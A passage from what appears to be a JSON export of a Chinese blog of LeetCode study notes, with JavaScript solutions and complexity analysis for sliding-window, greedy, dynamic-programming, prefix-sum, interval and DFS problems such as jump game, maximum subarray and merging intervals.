增大窗口\n        right++;\n        // 进行窗口内数据的一系列更新\n        ...\n\n        // *** debug 输出的位置 ***\n        // 注意在最终的解法代码中不要 print\n        // 因为 IO 操作很耗时，可能导致超时\n        console.log(\"window: [%d, %d)\\n\", left, right);\n        // *********************\n\n        // 判断左侧窗口是否要收缩\n        while (window needs shrink) {\n            // d 是将移出窗口的字符\n            var d = s[left];\n            window.remove(d);\n            // 缩小窗口\n            left++;\n            // 进行窗口内数据的一系列更新\n            ...\n        }\n    }\n};\n```\n\n *  先定义 `need` 和 `win` 两个 Map\n\t * 用于记录目标字符串 p 中字符出现的次数\n\t * 窗口中字符出现的次数\n * 定义 指针 `left = 0` 和 `right = 0` \n *  遍历字符串 s，先移动右指针\n\t *  当窗口中的字符满足条件时，开始移动左指针\n\t *  当窗口中的字符不满足条件时，继续移动右指针\n\t *  当窗口中的字符满足条件时，开始移动左指针\n\t\t * 每次移动都需要更新 `need` 和 `win` 两个 `map`\n\n#### 代码实现\n\n```javascript\n/**\n * @description: 438. 找到字符串中所有字母异位词\n *  ① 先定义 need 和 win 两个 Map，用于记录目标字符串 p 中字符出现的次数和窗口中字符出现的次数\n *  ② 遍历字符串 s，先移动右指针，当窗口中的字符满足条件时，开始移动左指针\n *  ③ 当窗口中的字符不满足条件时，继续移动右指针\n *  ④ 当窗口中的字符满足条件时，开始移动左指针\n * @param {string} s\n * @param {string} p\n * @return {number[]}\n */\nvar findAnagrams = function (s, p) {\n  // 用于存放结果\n  const res = [];\n\n  // 记录【窗口】中的字符出现的次数\n  const win = new Map();\n  // 记录 p 中所有字符出现的次数\n  const need = new Map();\n\n  // 看每个字符出现的次数\n  for (let c of p) {\n    need.set(c, (need.get(c) || 0) + 1);\n  }\n\n  let left = 0;\n  let right = 0;\n\n  // 记录窗口中已经匹配的字符个数\n  // 如果 valid 和 need.size 的大小相同，则说明窗口已满足条件，已经完全匹配\n  let valid = 0;\n\n  // 遍历字符串，先移动右指针，当窗口内的字符符合要求时，再移动左指针\n  while (right < s.length) {\n    let c = s[right];\n    right++;\n    // 进行窗口内数据的一系列更新\n    // 判断右侧窗口是否要扩大，need 中是否有这个字符, 有的话就加入窗口\n    if (need.has(c)) {\n      // 更新窗口内数据，每个字符出现的次数\n      win.set(c, (win.get(c) || 0) + 1);\n      // 判断窗口内的字符出现的次数是否符合要求\n      // 这个时候 valid 用来记录符合要求的字符个数\n      if (win.get(c) === need.get(c)) {\n        valid++;\n      }\n    }\n\n    // 判断左侧窗口是否要收缩\n    // 当窗口大小大于 p 的长度时，就要收缩\n    while (right - left >= p.length) {\n      // 当窗口符合条件时，把起始索引 left 加入结果\n      if (valid === need.size) {\n        res.push(left);\n      }\n      // d 是将移出窗口的字符\n      let d = s[left];\n      left++;\n      // 如果 d 是需要的字符，这个时候就要更新窗口，因为要移出窗口了\n      // valid 用来记录符合要求的字符个数\n      // 如果 d 的次数和 need 中的次数相同，说明符合要求的字符个数要减少了\n      if (need.has(d)) {\n        if (win.get(d) === need.get(d)) {\n          valid--;\n        }\n        win.set(d, win.get(d) - 1);\n      }\n    }\n  }\n\n  return res;\n};\n\n```\n\n#### 复杂度分析\n\n这个算法的复杂度分析如下：\n\n- 时间复杂度：`O(n)`\n\t- n 是字符串 s 的长度。\n\t- 主循环遍历字符串 s 一次，right 指针从 0 移动到 n-1，这需要 O(n) 时间。\n\t\t- **内部的 while 循环看似可能导致二次循环**\n\t\t\t- 但实际上 left 指针最多也只会从 0 移动到 n-1，所以总的移动次数不会超过 n。\n\t\t\t- 指针 `left, right` 不会回退（它们的值只增不减）\n\t- Map 的操作（get, set, has）在平均情况下是 O(1) 的。\n\t- 因此，总的时间复杂度是 O(n)。\n空间复杂度：`O(K)`\n- **K 是字符集的大小**。在这个问题中，通常是固定的（例如，如果只考虑小写字母，**K = 26**）。\n- win 和 need 这两个 Map 的大小不会超过字符集的大小。\n- res 数组的大小最坏情况下可能接近 n，但通常会远小于 n。\n- 其他变量（left, right, valid）占用常数空间。\n- 因此，总的空间复杂度是 O(K)，其中 K 是常数。\n\n","UpLao1Hy":"\n# 压缩字符串\n\n\n`#算法/双指针`  `#leetcode`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/b269dbb6ca9b010349e814b8bfbfb370.png)\n\n## 解题思路\n\n- 快慢指针\n\t- `write` 代表`原地`写入\n\t\t- write 需要正常写入字母 + 出现的次数\n\t- `read` 代表往后面`读`\n\n## 代码实现\n\n```javascript\n/**\n * @param {character[]} chars\n * @return {number}\n */\nvar compress = function (chars) {\n  // 快慢指针,都从0开始\n  // write 为慢指针，read 为快指针\n  let write = 0;\n  let read = 0;\n  let n = chars.length;\n  // 快指针遍历数组\n  while (read < n) {\n    // 当前字符\n    let c = chars[read];\n    // 计数器，用于记录当前字符出现的次数\n    let count = 0;\n    // 当快指针对应的元素等于快指针对应的元素时，快指针向后移动一位，计数器加一\n    while (read < n && chars[read] === c) {\n      read++;\n      count++;\n    }\n    // 将当前字符及其出现次数写入数组\n    chars[write++] = c;\n    // 仅在出现次数大于 1 时，才将次数写入数组\n    if (count > 1) {\n      // String(count).split(\"\") 将数字转换为字符串，再转换为字符数组,比如 b12 -> ['b','1', '2']\n      for (let i of String(count).split(\"\")) {\n        chars[write++] = i;\n      }\n    }\n  }\n  return write;\n};\n\n```\n\n> - 严格说还需要把数组后面的元素干掉\n> - `String(count).split(\"\")` 用于处理 `count = 12` 这种场景\n\n### 复杂度分析\n\n## 错误记录\n\n","68avHDuU":"\n# 跳跃游戏 II\n\n\n`#leetcode`   `#2024/08/17` `#算法/动态规划`   `#算法/贪心算法` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012|568](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240817091058.png)\n\n保证你一定可以跳到最后一格，请问你**最少要跳多少次**，才能跳过去\n\n## 2. 解题思路\n\n### 2.1. 解题思路一：动态规划\n\n#### 2.1.1. `dp` 函数定义\n\n从`索引 p` 跳到最后一格，至少需要 `dp(nums, p)` 步\n\n#### 2.1.2. 动态规划框架模板\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @return {number}  \n */  \nvar jump = function (nums) {  \n    const len = nums.length;  \n    // 默认值是 len, 因为最坏的情况就是每次只跳 1 步,最大步数就是 len - 1\n    // len 代表不可达  \n    const memo = new Array(len).fill(len);  \n    return dp(nums, 0, memo);  \n  \n};  \n  \n/**  \n * @description dp(nums, i, memo) 表示从第 i 个位置跳到最后一个位置所需要的最少步数  \n * @param {number[]} nums 跳跃数组  \n * @param {number} i 当前位置  \n * @param {number[]} memo 备忘录  \n * */  \nfunction dp(nums, i, memo) {  \n    // ... 待补充  \n}\n```\n\n#### 2.1.3. 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar jump = function (nums) {\n\n    const len = nums.length;\n    // 默认值是 len, 因为最坏的情况就是每次只跳 1 步,最大步数就是 len - 1\n    // len 代表不可达\n    const memo = new Array(len).fill(len);\n\n    return dp(nums, 0, memo);\n\n};\n\n/**\n * @description dp(nums, i, memo) 表示从第 i 个位置跳到最后一个位置所需要的最少步数\n * @param {number[]} nums 跳跃数组\n * @param {number} i 当前位置\n * @param {number[]} memo 备忘录\n * */\nfunction dp(nums, i, memo) {\n    // base case\n    const len = nums.length;\n    if (i >= len - 1) {\n        return 0;\n    }\n    // 之前已经计算过，直接返回备忘录的值\n    if (memo[i] !== len) {\n        return memo[i];\n    }\n    // 当前位置最多能跳的步数\n    const steps = nums[i];\n    // 从当前位置跳 steps 步\n    for (let step = 1; step <= steps; step++) {\n        // 下一个位置\n        const next = i + step;\n        // 递归求解\n        const subProblem = dp(nums, next, memo);\n        // 更新 memo\n        memo[i] = Math.min(memo[i], 1 + subProblem);\n    }\n    // 返回 memo[i]\n    return memo[i];\n}\n\n```\n\n#### 2.1.4. 复杂度分析\n\n- 时间复杂度：`O(n * m)`，其中 n 是数组长度，m 是数组中的最大值。但由于使用了记忆化，实际运行时间通常会更优。\n- 空间复杂度：`O(n)`\n\n> 上面的复杂度很高的，有没有更高效的算法，见下面的贪心算法题解\n\n### 2.2.  解题思路二：贪心算法\n\n我们不需要像[#2.1. 解题思路一：动态规划](/post/68avHDuU.html#21-解题思路一动态规划) 那样真的「递归地」穷举出所有选择的具体结果来比较求最值，而**只需要每次选择那个最有潜力的局部最优解**，最终就能得到**全局最优解**。\n\n#### 2.2.1.1. 一个形象的例子\n\n- 想象你正在玩一个跳石头过河的游戏：\n\t- 河面上有一排石头，每个石头上有一个数字，表示你从这个石头最远可以跳多远。\n\t- 你的目标是用最少的跳跃次数到达最后一个石头。\n\t- 你总是可以到达最后一个石头。\n- **贪心算法的核心思想**是：每次跳跃时，都要选择能够使你**在下一跳到达最远位置的石头**。\n- 例子：\n\t- 假设石头上的数字是 `[2, 3, 1, 1, 4]`\n\t- 第 0 个石头（值为 2）：\n\t\t- 你站在第一个石头上，可以跳 1 步 或  2 步。\n\t\t- 如果跳 1 步到索引 1，**下一跳**最远可以到达索引 4（`1 + 3 = 4`）。\n\t\t- 如果跳 2 步到索引 2，**下一跳**最远只能到达索引 3（`2 + 1 = 3`）。\n\t\t- **贪心选择**：跳到索引 1（值为 3 的石头），**因为它能让你下一跳到达最远**。\n\t- 第 1 个石头（值为 3）：\n\t\t- 你现在在索引 1，可以跳 1、2 或 3 步。\n\t\t- 但是不管跳几步，都能直接到达最后一个石头。\n\t\t- 贪心选择：直接跳到最后一个石头。\n\t- 总跳跃次数：2 次\n\n这就像是在玩**看得最远跳得最远** 的游戏。每次跳跃，你都选择一个能让你在下一跳看得最远的地方。这样，你就能用最少的跳跃次数到达终点。\n\n这个贪心策略之所以有效，是因为题目保证了总是可以到达最后一个位置。所以我们不需要担心会跳到一个\"死胡同\"，只需要专注于如何跳得最远。\n\n#### 2.2.1.2. 再看例子，如下图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240817110226.png)\n\n### 2.2.2. 代码实现\n\n```javascript hl:19\n/**\n * @description 贪心算法解法\n * @param {number[]} nums\n * @return {number}\n */\nvar jump = function (nums) {\n    const len = nums.length;\n    // 当前位置，表示当前所在的位置，已经跳到了哪里，即索引\n    let currentPosition = 0;\n    // 步数，不是数组，而是一个数\n    let stepsNum = 0;\n    // 能跳的最远距离\n    let maxJump = 0;\n\n    // 注意这里是小于 len - 1, 因为最后一个位置不用跳\n    // 每次跳跃都选择【下一个位置】能跳的最远的地方\n    for (let i = 0; i < len - 1; i++) {\n        // 更新 maxJump\n        // 下个跳跃位置能够到达的最远距离为 【i + nums[i]】\n        maxJump = Math.max(maxJump, i + nums[i]);\n        // 到达当前位置的时候，更新 currentPosition\n        if (i === currentPosition) {\n            currentPosition = maxJump;\n            stepsNum++;\n        }\n    }\n    // 返回结果\n    return stepsNum;\n};\n\n```\n\n### 2.2.3. 复杂度分析\n\n- 时间复杂度：O(n)\n\t- 其中 n 是输入数组的长度。\n- 空间复杂度：O(1)\n\t- 算法只使用了几个额外的变量（currentPosition, stepsNum, maxJump），这些都是常数级的额外空间。\n\t- 没有使用任何与输入规模相关的额外数据结构。\n\n","nIDWU1tn":"\n# 字母异位词分组\n\n`#2024/07/28` `#leetcode`  `#算法/哈希`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281620623.png?imageSlim)\n\n## 解题思路\n\n- 先分组：按照由同相同字母组合成的单词来分组\n   - 使用 `hash` 特定的 `key 值` 来分组\n- 然后再把`分组后的 hash` 转成 `二维数组`\n\n## 代码实现\n```javascript\nvar groupAnagrams = function (strs) {\n  // 编码到分组的映射\n  let codeToGroup = new Map();\n  for (let s of strs) {\n    // 对字符串进行编码\n    let code = encode(s);\n    // 把编码相同的字符串放在一起\n    if (!codeToGroup.has(code)) {\n      codeToGroup.set(code, []);\n    }\n    codeToGroup.get(code).push(s);\n  }\n\n  // 获取结果\n  let res = [];\n  for (let group of codeToGroup.values()) {\n    res.push(group);\n  }\n\n  return res;\n};\n\n/*\n * @description: 利用每个字符的出现次数进行编码\n * @param {string} s\n * @return {string}\n * @example 1: encode(\"abc\") => \"1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\"\n * @example 2: encode(\"abbccc\") => \"1,2,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\"\n * @example 3: encode(\"aabbcc\") => \"2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\"\n */\nfunction encode(s) {\n  // 初始化一个长度为 26 的数组，用于记录每个字符的出现次数\n  let arr = new Array(26).fill(0);\n  for (let c of s) {\n    // 返回 c 的 Ascii 码值, 减去 'a' 的 Ascii 码值, 得到 c 相对于 'a' 的偏移量\n    // 即 a -> 0, b -> 1, c -> 2, ..., z -> 25\n    let delta = c.charCodeAt() - \"a\".charCodeAt();\n    // 更新字符 c 的出现次数\n    arr[delta]++;\n  }\n  return arr.toString();\n}\n\n```\n\n## 错误记录\n\n","m73iaeSF":"\n# 最大子数组和\n\n\n`#leetcode`   `#2024/08/18` `#算法/动态规划`  `#算法/滑动窗口`  `#算法/前缀和` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012|640](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818180606.png)\n\n## 2. 思路一：前缀和思路\n\n### 2.1. 思路描述\n\n前缀和数组 `preSum` 就是 `nums` 元素的累加和\n- `preSum[i+1] - preSum[j]` 其实就是子数组 `nums[j..i]` 之和（根据 `preSum` 数组的实现，索引 0 是占位符，所以 `i` 有一位索引偏移）\n- 那么反过来想，以 `nums[i]` 为结尾的最大子数组之和是多少？\n\t- 其实就是 `preSum[i+1] - min(preSum[0..i])`\n\t- **最大子数组和 = 当前位置的前缀和 - 最小前缀和**， 所以设置两个变量\n\t\t- `res` 代表 `最大子数组和`\n\t\t- `minPreSum` 代表 `当前位置之前的最小前缀和`\n\n > [!danger]\n>   注意是：`preSum[i+1] - minPreSum ` ，不是 `preSum[i]`\n\n### 2.2. 代码实现\n\n```javascript\n/**  \n * @description 最大子数组和，前缀和思路  \n * @param {number[]} nums  \n * @return {number} 返回最大子数组和  \n */  \nvar maxSubArray = function (nums) {  \n    /*************************************************  \n     * ::::::::::::::::: 构造前缀和 ::::::::::::::::::  \n     ************************************************/  \n    let preSum = [0];  \n    /*************************************************  \n     * ::::① 注意 i 从 1 开始，因为前缀和数组的第一个元素是 0::::  \n     * ::::② i <= nums.length，因为前缀和数组的长度是 nums.length + 1::::  \n     ************************************************/  \n    for (let i = 1; i <= nums.length; i++) {  \n        preSum[i] = preSum[i - 1] + nums[i - 1];  \n    }  \n    /*************************************************  \n     * ::::当前的最大子数组和，初始化为最小值::::  \n     * ::::即 Number.MIN_VALUE 或者 初始化题设中的最小值即可::::  \n     ************************************************/  \n    let res = -10000 * 100000;  \n    /*************************************************  \n     * ::::当前位置之前的最小前缀和，初始化最大值 ::::  \n     ************************************************/  \n    let minPreSum = 10000 * 100000;  \n    // 最大子数组和 = 当前位置元素的前缀和 - 最小前缀和  \n    for (let i = 0; i < nums.length; i++) {  \n        // 更新最小前缀和  \n        minPreSum = Math.min(minPreSum, preSum[i]);  \n        //公式：最大子数组和 = 当前位置元素的前缀和 - 最小前缀和  \n        res = Math.max(res, preSum[i + 1] - minPreSum);  \n    }  \n    return res;  \n};\n```\n \n### 2.3. 复杂度分析\n\n- 时间复杂度是 O(n)，其中 n 是数组的长度，因为我们只遍历了数组一次\n- 空间复杂度是 O(1)，因为我们只使用了常数额外空间\n\n### 2.4. 错误记录\n\n- 如何初始化一个 preSum ?  **得没有意识的就得写对**\n\n## 3. 思路二：动态规划思路\n\n### 3.1. dp 定义\n\n- 以 `nums[i]` 为结尾的「最大子数组和」为 `dp[i]`。\n- `dp[i]` 有两种「选择」，\n\t- 要么与前面的相邻子数组连接，形成一个和更大的子数组\n\t- 要么不与前面的子数组连接，自成一派，自己作为一个子数组\n\n### 3.2. 状态转移方程\n\n依然使用数学归纳法来找状态转移关系：假设我们已经算出了 `dp[i-1]`，如何推导出 `dp[i]` 呢？\n\n```javascript\n// 要么自成一派，要么和前面的子数组合并 \nvar dp[i] = Math.max(nums[i], nums[i] + dp[i - 1]);\n```\n\n### 3.3. 代码实现\n\n- ①  `dp[i]` 表示以 `nums[i]` 结尾的连续子数组的最大和\n- ②  base case\n- ③ 遍历，使用状态转移方程得到 dp 数组\n- ④  遍历 dp 数组，找到最大值\n\n```javascript\n/**  \n * @description 最大子数组和，动态规划思路  \n * @param {number[]} nums  \n * @return {number} 返回最大子数组和  \n */  \nvar maxSubArray = function (nums) {  \n    // ①  dp[i] 表示以 nums[i] 结尾的连续子数组的最大和  \n    let dp = new Array(nums.length);  \n    // ②  base case    dp[0] = nums[0];  \n    // ③ 遍历，使用状态转移方程得到 dp 数组  \n    for (let i = 1; i < nums.length; i++) {  \n        dp[i] = Math.max(nums[i], dp[i - 1] + nums[i]);  \n    }  \n    // ④  遍历 dp 数组，找到最大值 \n    let res = -10000 * 100000;   \n    for (let i = 0; i < dp.length; i++) {  \n        res = Math.max(res, dp[i]);  \n    }  \n    return res;  \n};\n```\n\n### 3.4. 复杂度分析\n\n时间复杂度分析：\n1. 第一个循环：遍历数组填充 dp 数组，需要 O(n) 时间。\n2. 第二个循环：遍历 dp 数组找最大值，也需要 O(n) 时间。\n3. 总的时间复杂度：`O(n) + O(n) = O(n)`，其中 n 是输入数组的长度。\n\n空间复杂度分析：\n- 使用了一个额外的 dp 数组，长度与输入数组相同。\n- 空间复杂度：`O(n)`\n\n## 4. 思路三：滑动窗口\n\n### 4.1. 思路\n\n- **窗口内元素之和大于等于 0 时**扩大窗口\n- **在窗口内元素之和小于 0 时**缩小窗口\n- 在每次移动窗口时更新答案\n\n### 4.2. 代码实现\n\n```javascript\n/**\n * @description 最大子数组和，滑动窗口思路\n * @param {number[]} nums\n * @return {number} 返回最大子数组和\n */\nvar maxSubArray = function (nums) {\n  let res = -10000 * 100000;\n  // ①  初始化左指针，右指针，窗口内元素的和\n  let left = 0; // 左指针\n  let right = 0; // 右指针\n  let windowSum = 0; // 窗口内元素的和\n\n  // ②  遍历，使用滑动窗口思路\n  while (right < nums.length) {\n    // ③  更新 windowSum\n    windowSum += nums[right];\n    // ④  更新右指针\n    right++;\n    // ⑤  更新结果\n    res = Math.max(res, windowSum);\n    // ⑥  判断是否需要收缩左指针\n    while (windowSum < 0) {\n      // ⑦  更新 windowSum\n      windowSum -= nums[left];\n      left++;\n    }\n  }\n  return res;\n};\n\n```\n\n### 4.3. 复杂度分析\n\n时间复杂度分析：\n1. 外层 while 循环：右指针 right 从 0 移动到 nums.length，这需要 O(n) 时间。\n2. 内层 while 循环：左指针 left 最多也只会从 0 移动到 nums.length。\n3. 虽然有嵌套的循环，但每个元素最多被访问两次（一次被加入窗口，一次被移出窗口）。\n4. 总的时间复杂度：O(n)，其中 n 是输入数组的长度。\n空间复杂度分析：\n- 使用了常数额外空间（left, right, windowSum, res）。\n- 空间复杂度：O(1)\n\n## 5. 参考\n\n- https://labuladong.online/algo/dynamic-programming/maximum-subarray\n\n","PlxQ08Jl":"\n# 省份数量\n\n\n`#leetcode`   `#2024/09/12`  `#算法`  `#DFS` `#算法/图` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n> https://leetcode.cn/problems/number-of-provinces/description \n\n![cos-blog-832-34-20241012|1128](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240912044955.png)\n\n> **省份是一组间接或直接连接的城市**\n## 2. 思路一：DFS\n\n1. **初始化**：创建一个布尔数组 `visited`，用于记录每个城市是否已被访问\n2. **遍历城市**： \n\t- 对于每个城市，如果它未被访问，则执行 DFS，**从该城市出发访问所有与之相连的城市**\n3. **DFS 实现**\n\t- **递归地访问**所有直接相连且未被访问的城市，并**标记**为已访问。\n4. **计数省份**\n\t- 每次执行新的 DFS 时，意味着发现了一个新的省份，增加省份计数。\n\n### 2.1. 代码实现及分析\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240912051336.png)\n\n### 2.2. 源码\n\n```javascript\n/**\n * @param {number[][]} isConnected\n * @return {number}\n */\nvar findCircleNum = function (isConnected) {\n  // 城市数量\n  let n = isConnected.length;\n  // 记录城市是否被访问,都初始化为未访问\n  let visited = new Array(isConnected.length).fill(false);\n  // 记录省份数量\n  let res = 0;\n\n  // 访问某个城市\n  function dfs(city) {\n    // 标记城市已访问\n    visited[city] = true;\n    // 访问所有与城市相连的城市\n    for (let i = 0; i < n; i++) {\n      // 如果城市 i 与城市 city 相连,并且城市 i 未被访问,则访问城市 i\n      if (isConnected[city][i] === 1 && !visited[i]) {\n        dfs(i);\n      }\n    }\n  }\n\n  // 遍历所有城市\n  for (let i = 0; i < n; i++) {\n    if (!visited[i]) {\n      dfs(i);\n      res++;\n    }\n  }\n\n  // 返回省份数量\n  return res;\n};\n\n```\n\n### 2.3. 时间复杂度：O(n^2)\n\n1. 外层循环遍历所有城市，最多执行 n 次（n 为城市数量）。\n2. 对于每个未访问的城市，我们调用 dfs 函数。\n3. 在 dfs 函数中，我们遍历该城市与所有其他城市的连接关系，这需要 O(n) 的时间。\n4. 虽然看起来我们可能会多次调用 dfs，但**由于 visited 数组的存在，每个城市实际上只会被访问一次。**\n5. 因此，总的时间复杂度是 `O(n) * O(n) = O(n^2)`，因为我们**本质上**是==遍历了整个 n x n 的邻接矩阵==。\n\n### 2.4. 空间复杂度：O(n)\n\n1. visited 数组：使用了一个大小为 n 的布尔数组来记录每个城市的访问状态，占用 `O(n)` 的空间。\n2. 递归调用栈：在最坏情况下（所有城市形成一条链），递归调用栈的深度可能达到 n，占用 O(n) 的空间。\n3. 其他变量（如 n, res）占用常数空间。\n4. 因此，总的空间复杂度是 O(n)。\n\n### 2.5. 总结\n\n- 时间复杂度：O(n^2)\n- 空间复杂度：O(n)\n\n这个实现的时间复杂度主要来自于需要检查每对城市之间的连接关系。空间复杂度则主要由 visited 数组和可能的递归调用栈深度决定。\n\n虽然这个解决方案在时间复杂度上不是最优的，但它直观且易于理解。对于中小规模的输入，这种方法通常表现良好。如果需要处理非常大规模的数据，可能需要考虑使用**并查集（Union-Find）**等更高效的数据结构来优化性能。\n\n## 3. 思路二：并查集（Union-Find）\n\n后面讲，先忽略\n\n","eakfqB2S":"\n# 跳跃游戏\n\n\n`#leetcode`   `#2024/08/16`  `#算法/贪心算法`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n[https://leetcode.cn/problems/jump-game/](https://leetcode.cn/problems/jump-game/)\n\n![cos-blog-832-34-20241012|528](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240816081854.png)\n\n## 解题思路\n\n### 思路一：贪心算法\n\n1. 贪心算法： 我们可以使用贪心算法来解决这个问题。核心思想是维护一个变量 `maxReach`，表示能够到达的**最远位置**。\n2. 遍历数组： 从左到右遍历数组，对于每个位置，我们更新 `maxReach`。\n3. 更新 `maxReach`： 对于当前位置 i，我们可以跳到的最远位置是 `i + nums[i]`\n\t- 因此，`maxReach` 应该更新为 `Math.max(maxReach, i + nums[i])` \n4. 检查是否可以继续： \n\t- 如果在某个`位置 i`，`maxReach` 小于或等于 i，且 `i` 还不是最后一个位置，那么我们就无法继续前进，返回 false。\n5. 到达终点： 如果我们能够遍历完整个数组，那么就意味着我们可以到达最后一个位置，返回 true。\n\n#### 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {boolean}\n */\nvar canJump = function (nums) {\n  // 代表当前能到达的最远位置\n  let maxReach = 0;\n\n  for (let i = 0; i < nums.length; i++) {\n    // 如果当前位置大于最远位置，说明无法到达\n    // maxReach 是当前能到达的最远位置\n    // 例如 [3, 2, 1, 0, 4]，当 i = 4 时，maxReach = 3，无法到达\n    // 例如 [2, 3, 1, 1, 4]，当 i = 4 时，maxReach = 4，可以到达\n    if (i > maxReach) {\n      return false;\n    }\n    // 更新最远位置\n    // i + nums[i] 代表当前位置能到达的最远位置,i 是当前位置，nums[i] 是当前位置的值\n    // question: 为什么要取最大值？\n    // answer: 因为当前位置的值是当前位置能到达的最远位置，所以要取最大值\n    maxReach = Math.max(maxReach, i + nums[i]);\n  }\n  // 如果最远位置大于等于数组长度，说明可以到达\n  return true;\n};\n```\n\n#### 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 n 是数组的长度，因为我们只遍历了一遍数组。\n- 空间复杂度是 `O(1)`，因为我们只使用了常数额外空间\n\n### 思路二：动态规划\n\n#### 代码实现\n\n#### 复杂度分析\n\n## 错误记录\n","7iLkM5NM":"\n# 合并区间\n\n\n`#leetcode`   `#2024/08/18`  `#算法/区间问题`   \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012|632](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818205928.png)\n\n## 2. 思路一：区间问题\n\n所谓**区间问题**，就是**线段问题**，让你合并所有线段、找出线段的交集等等。主要有**两个技巧**：\n\n1. **排序**\n\t- 先按照起点**升序**排序，\n\t- 若起点相同，则按照终点**降序**排序。\n\t- ![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818211143.png)\n2. **画图**。就是说不要偷懒，勤动手，两个区间的相对位置到底有几种可能，不同的相对位置我们的代码应该怎么去处理，如下图：\n\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Interval%20Problems.gif)\n\n最终如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818210720.png)\n### 2.1. 代码实现\n\n```javascript hl:8,13,19,22,26\n/**\n * @description 合并区间\n * @param {number[][]} intervals\n * @return {number[][]}\n */\nvar merge = function (intervals) {\n  let res = [];\n  //:::: ① 先按照区间的起始位置排序，升序排序,如果起始位置相同，则按照结束位置降序排序\n  intervals.sort((a, b) => a[0] - b[0] || b[1] - a[1]);\n\n  // 因为已经按照区间的起始位置排序了，所以可以直接将第一个区间放入结果数组中\n  res.push(intervals[0]);\n  //:::: ② 遍历区间数组\n  for (let i = 1; i < intervals.length; i++) {\n    let currInterval = intervals[i];\n    // 获取结果数组中最后一个区间\n    let lastInterval = res[res.length - 1];\n\n    //:::: ③ 判断当前区间的起始位置是否小于等于结果数组中最后一个区间的结束位置\n    // 如果小于等于，则说明两个区间有重叠，可以合并\n    if (currInterval[0] <= lastInterval[1]) {\n      //:::: ④ 更新结果数组中最后一个区间的结束位置\n      // 更新为当前区间的结束位置和结果数组中最后一个区间的结束位置的最大值\n      lastInterval[1] = Math.max(lastInterval[1], currInterval[1]);\n    } else {\n      //:::: ⑤ 如果不重叠，则直接将当前区间放入结果数组中\n      res.push(currInterval);\n    }\n  }\n  return res;\n};\n```\n\n### 2.2. 复杂度分析\n\n时间复杂度分析：\n1. 排序：使用了 JavaScript 的**内置排序方法**，时间复杂度为 `O(n log n)`，其中 n 是区间的数量。\n2. 遍历区间：一次线性遍历，时间复杂度为 `O(n)`。\n3. 总的时间复杂度：`O(n log n) + O(n) = O(n log n)`，主要由排序步骤决定。\n\n空间复杂度分析：\n1. 结果数组 res：在最坏情况下（没有重叠的区间），可能需要存储所有的输入区间，空间复杂度为 O(n)。\n2. 排序：JavaScript 的排序算法通常使用额外的 O(log n) 到 O(n) 的空间。\n3. 总的空间复杂度：`O(n)`，主要由结果数组和排序过程决定。\n\n## 3. 错误记录\n\n> [!danger]\n> `Array.sort`  升序为 `a - b` ，降序为 `b - a `\n\n- 先升\n- 若相同，再降序 `a[0] - b[0] || b[1] - a[1]`\n\n```javascript hl:1\n// 按照区间的起始位置排序，升序排序,如果起始位置相同，则按照结束位置降序排\nintervals.sort((a, b) => a[0] - b[0] || b[1] - a[1]);\n```\n\n","zIbYBoum":"\n# 和为 K 的子数组\n\n\n`#leetcode`   `#2024/08/10`  `#算法/前缀和` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|648](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810145638.png)\n\n> [!danger]\n>  **返回的是和位 k 的子数组的个数，而不是某个子数组的元素个数（长度）**\n\n## 解题思路\n\n### 思路一\n\n关键思想：\n- 通过**前缀和**，我们将\"寻找和为 k 的子数组\"转化为\"寻找两个前缀和之差为 k\"。\n- 使用**哈希表**存储前缀和的出现次数，使得我们可以在 O(1) 时间内查找是否存在满足条件的前缀和。\n\n下面是详细介绍：\n\n- 通过**前缀和**，我们将 \"**寻找和为 k 的子数组**\"  转化为 \"**寻找两个前缀和之差为 k**\"\n\t- 即 遍历一遍数组，计算前缀和的时候，随便看看已经遍历生成的前缀和中，是否存在两个前缀和之差为 `k`\n- 寻找两个前缀和之差为 k，为了方便查找\n\t- 使用**哈希**\n \n#### 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} k\n * @return {number}\n */\nvar subarraySum = function (nums, k) {\n  // 前缀和,注意前缀和的长度是 nums.length + 1\n  // preSum[i] 表示 nums[0] 到 nums[i - 1] 